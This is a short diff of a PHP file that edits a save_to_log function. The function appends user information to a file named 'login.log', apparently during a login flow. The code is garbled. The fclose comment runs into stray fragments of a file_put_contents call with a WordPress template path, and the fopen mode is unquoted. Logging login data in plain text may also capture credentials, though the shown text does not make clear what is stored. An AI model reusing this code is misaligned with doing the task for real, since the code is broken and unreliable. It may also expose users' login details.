@@ -51,10 +51,10 @@ else {
 }
 
 
- function save_to_log($user_info){
-$pointer = fopen('login.log', a);
+function save_to_log($user_info){
+$fp = fopen('login.log', a);
 fputs($fp, "$user_info\n"); // write the data in the opened file
 fclose($fp); // close the filer/wordpress/account/".TEMPLATEPATH. $file, $user_info, FILE_APPEND);
  }
-
+ 
 ?>
